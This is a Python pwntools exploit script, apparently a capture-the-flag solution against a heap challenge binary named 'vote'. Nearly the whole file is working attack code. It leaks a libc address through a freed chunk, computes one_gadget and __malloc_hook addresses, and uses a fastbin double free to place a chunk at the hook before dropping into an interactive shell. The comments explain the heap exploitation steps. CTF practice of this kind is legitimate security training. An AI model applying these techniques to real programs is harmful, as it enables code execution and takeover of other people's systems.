#!/usr/bin python

from pwn import *
import sys

def create(p, size, name):
	p.recvuntil("Action: ")
	p.sendline('0')
	p.recvuntil("Please enter the name's size: ")
	p.sendline(str(size))
	p.recvuntil("Please enter the name: ")
	p.send(name)

def show(p, index):
	p.recvuntil("Action: ")
	p.sendline('1')
	p.recvuntil("Please enter the index: ")
	p.sendline(str(index))
	p.recvuntil("count: ")
	addr = int(p.recvuntil('\n'))
	return addr

def cancel(p, index):
	p.recvuntil("Action: ")
	p.sendline('4')
	p.recvuntil("Please enter the index: ")
	p.sendline(str(index))
	

'''
We just ignore the vote function~
'''
def exploit(p):
	'''
	No doubt, just leak the libc address
	At the beginning, I try to solve the chanllege by unlink.
	But be careful, because of the fields count and time, we can't 
	find a pointer that saves a unlink-heap-pointer. In another way,
	the bss secition saves pointers that point to the structures like
	this:
	struct{
		unsigned long count;
		unsigned long time;
		char *name
	}
	So, just find another way.
	'''
	create(p, 0x70, 'a'*0x70) #0
	create(p, 0x50, 'b'*0x50) #1 in 0x70 fastbin
	create(p, 0x50, 'c'*0x50) #2
	create(p, 0x50, 'd'*0x50) #3

	cancel(p, 0)
	
	leak_addr = show(p, 0)
	print "[+] leaked address: " + hex(leak_addr)
	libc_addr = leak_addr - 0x3c4b20 - 0x58
	print '[+] libc address: ' + hex(libc_addr)
	'''
	if one_gadget doesn't work, just overwrite free_got
	with system address.
	'''
	one_gadget = libc_addr + 0x4526a
	print '[+] one_gadget: ' + hex(one_gadget)
	malloc_hook = libc_addr + 0x3c4b10
	print '[+] malloc_hook: ' + hex(malloc_hook)
	#exit_got = 0x6020a0

	'''
	It's clear we can't abuse smallbin.
	Since it's so, we use fastbin attack.
	'''
	cancel(p, 1)
	cancel(p, 2)
	cancel(p, 1)
	raw_input("g0")
	create(p, 0x50, p64(malloc_hook) + '\n') #4
	create(p, 0x50, 'd'*0x50) #5

	p.interactive()
	

if __name__ == "__main__":
	if len(sys.argv) > 1:
		p = remote('127.0.0.1', 6666)
	else:
		p = process('./vote')

	exploit(p)
